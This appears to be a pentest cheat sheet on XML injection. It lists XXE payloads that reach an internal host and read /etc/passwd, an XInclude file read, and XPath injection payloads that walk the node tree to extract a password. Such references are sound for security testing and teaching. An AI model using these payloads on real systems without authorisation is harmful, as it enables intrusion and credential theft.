# XML Injection

## References & Resources

- [What is XML Injection](https://portswigger.net/web-security/xxe)

## Exploits

Make a call to extarnal System
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

Read The Password File
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

XInclude Attack
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Values should be encoded
```
?xml=<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>
```

## XPath Attacks

How to find:
add `'` to any value in path, and get an error:
```
SimpleXMLElement::xpath()
```

XML Bolean Logic

Just like SQL injection, XPath allows you to do boolean logic, and you can try:

- ' and '1'='1 and you should get the same result.
- ' or '1'='0 and you should get the same result.
- ' and '1'='0 and you should not get any result.
- ' or '1'='1 and you should get all results.

To comment out the rest of the XPath expression, you can use a NULL BYTE (which you will need to encode as %00). As we can see in the XPath expression above, we also need to add a ] to properly complete the syntax. Our payload now looks like `hacker']%00` (or `hacker' or 1=1]%00` if we want all results).

If we try to find the child of the current node, using the payload '%20or%201=1]/child::node()%00, we don't get much information.

Here, the problem is that we need to get back up in the node hierarchy, to get more information. In XPath, this can be done using parent::* as part of the payload. We can now select the parent of the current node, and display all the child node using `hacker'%20or%201=1]/parent::*/child::node()%00`.

One of the node's value looks like a password. We can confirm this, by checking if the node's name is password using the payload `hacker']/parent::*/password%00`.
